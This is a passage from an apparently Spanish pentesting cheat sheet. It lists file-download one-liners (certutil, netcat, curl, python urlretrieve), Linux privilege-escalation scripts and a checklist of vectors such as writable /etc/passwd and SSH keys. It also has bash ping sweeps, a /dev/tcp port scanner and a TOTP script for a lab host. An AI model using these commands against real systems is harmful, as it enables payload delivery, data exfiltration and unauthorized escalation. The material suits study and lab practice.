</span><span class="n">powershell</span><span class="w"> </span><span class="s2">"wget &lt;URL&gt;"</span><span class="w">

</span><span class="c"># Python</span><span class="w">
</span><span class="n">python.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"from urllib import urlretrieve; urlretrieve('&lt;URL&gt;', '&lt;DESTINATION_FILE&gt;')"</span><span class="w">

</span><span class="c"># CertUtil</span><span class="w">
</span><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="s2">"&lt;URL&gt;"</span><span class="w">

</span><span class="c"># NETCAT</span><span class="w">
</span><span class="n">nc</span><span class="w"> </span><span class="nt">-lvp</span><span class="w"> </span><span class="nx">1234</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OUT_FILE</span><span class="err">&gt;</span><span class="w"> 
</span><span class="n">nc</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">1234</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">IN_FILE</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># CURL</span><span class="w">
</span><span class="n">curl</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">URL</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OUT_FILE</span><span class="err">&gt;</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="escalada-de-privilegios">Escalada de Privilegios</h3>

<h3 id="linux-2">Linux</h3>

<h4 id="enumeraci√≥n-con-scripts">Enumeraci√≥n con Scripts</h4>

<p><a href=""></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>
bash LinEnum.sh
bash lse.sh -l 1
bash linpeas.sh
python linuxprivchecker.py
./unix-privesc-check standard
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="vulnerability-scan">Vulnerability scan</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>perl les2.pl
bash les.sh
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="suid-checker">Suid checker</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td> --><td class="rouge-code"><pre>python suid3num.py

https://gtfobins.github.io/
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="methodology-to-follow">Methodology to follow</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td> --><td class="rouge-code"><pre>sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="scripts-en-bash">Scripts en BASH</h2>

<h3 id="enumeraci√≥n-de-red">Enumeraci√≥n de Red</h3>

<h4 id="enumeraci√≥n-de-hosts-usando-ping">Enumeraci√≥n de hosts usando ping</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">for </span>host <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
	</span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 10.0.0.</span><span class="nv">$i</span><span class="s2"> &amp;&gt;/dev/null"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"[*] Host 10.0.0.</span><span class="nv">$i</span><span class="s2"> - Active"</span> &amp;
<span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="enumeracion-de-multiples-redes-usando-ping">Enumeracion de multiples redes usando ping</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">function </span>ctrl_c<span class="o">(){</span>
    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo ...</span><span class="se">\n</span><span class="s2">"</span> 
    <span class="nb">exit </span>1<span class="p">;</span> tput cnorm
<span class="o">}</span>

<span class="c">#Ctrl + C</span>
<span class="nb">trap </span>ctrl_c INT

<span class="nv">networks</span><span class="o">=(</span>172.18.0 172.19.0<span class="o">)</span>

tput civis<span class="p">;</span> <span class="k">for </span>network <span class="k">in</span> <span class="k">${</span><span class="nv">networks</span><span class="p">[@]</span><span class="k">}</span><span class="p">;</span><span class="k">do
    </span><span class="nb">echo</span> <span class="s2">"[+] Enumerando Network: </span><span class="nv">$network</span><span class="s2">"</span>
    <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 </span><span class="nv">$network$i</span><span class="s2"> &amp;&gt;/dev/null"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Host </span><span class="nv">$network$i</span><span class="s2"> - ACTIVE"</span> &amp;
    <span class="k">done</span><span class="p">;</span> <span class="nb">wait
</span><span class="k">done</span><span class="p">;</span>tput cnorm
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="escaneo-de-puertos-para-multiples-hosts">Escaneo de puertos para multiples hosts</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">function </span>ctrl_c<span class="o">(){</span>
    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo ...</span><span class="se">\n</span><span class="s2">"</span> 
    <span class="nb">exit </span>1<span class="p">;</span> tput cnorm
<span class="o">}</span>

<span class="c">#Ctrl + C</span>
<span class="nb">trap </span>ctrl_c INT

<span class="nv">hosts</span><span class="o">=(</span>172.20.0.2 172.20.0.1 172.20.0.3<span class="o">)</span>

tput civis<span class="p">;</span> <span class="k">for </span>host <span class="k">in</span> <span class="k">${</span><span class="nv">hosts</span><span class="p">[@]</span><span class="k">}</span><span class="p">;</span><span class="k">do
    </span><span class="nb">echo</span> <span class="s2">"[+] Enumerando puertos del </span><span class="nv">$host</span><span class="s2">:"</span>
    <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 10000<span class="si">)</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo '' &gt; /dev/tcp/</span><span class="nv">$host</span><span class="s2">/</span><span class="nv">$i</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Port </span><span class="nv">$i</span><span class="s2"> - OPEN"</span> &amp;
    <span class="k">done</span><span class="p">;</span> <span class="nb">wait
</span><span class="k">done</span><span class="p">;</span>tput cnorm
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="monitorizaci√≥n-de-procesos">Monitorizaci√≥n de Procesos</h3>

<p>Podemos emplear el siguiente script en bash:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="nv">old_process</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> user,command<span class="si">)</span>

<span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do
	</span><span class="nv">new_process</span><span class="o">=</span><span class="si">$(</span>ps <span class="nt">-eo</span> user,command<span class="si">)</span>
	diff &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$old_process</span><span class="s2">"</span><span class="o">)</span> &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$new_process</span><span class="s2">"</span><span class="o">)</span> | <span class="nb">grep</span> <span class="s2">"[</span><span class="se">\&gt;\&lt;</span><span class="s2">]"</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"command|diff|kworker"</span>
	<span class="nv">old_process</span><span class="o">=</span><span class="nv">$new_process</span>
<span class="k">done</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<blockquote>
  <p>Podemos tambien hacer uso de la utilidad pspy:
<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p>
</blockquote>

<hr />

<h2 id="scripts-en-python">Scripts en Python</h2>

<h3 id="totp-empleando-ntp">TOTP empleando NTP</h3>

<p><code class="language-plaintext highlighter-rouge">TOTP</code> es un algoritmo que permite generar una contrase√±a de un solo uso que utiliza la hora actual como fuente de singularidad, cambiando as√≠ cada varios minutos. <a href="#NTP">NTP</a></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">pyotp</span>
<span class="kn">import</span> <span class="nn">ntplib</span>

<span class="n">client</span><span class="o">=</span><span class="n">ntplib</span><span class="p">.</span><span class="n">NTPClient</span><span class="p">()</span>
<span class="n">response</span><span class="o">=</span><span class="n">client</span><span class="p">.</span><span class="n">request</span><span class="p">(</span><span class="s">"10.10.10.246"</span><span class="p">)</span>

<span class="n">totp</span> <span class="o">=</span> <span class="n">pyotp</span><span class="p">.</span><span class="n">TOTP</span><span class="p">(</span><span class="s">"orxxi4c7orxwwzlo"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"EL TOKEN es -&gt; %s"</span> <span class="o">%</span> <span class="n">totp</span><span class="p">.</span><span class="n">at</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">tx_time</span><span class="p">))</span>

</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

:ET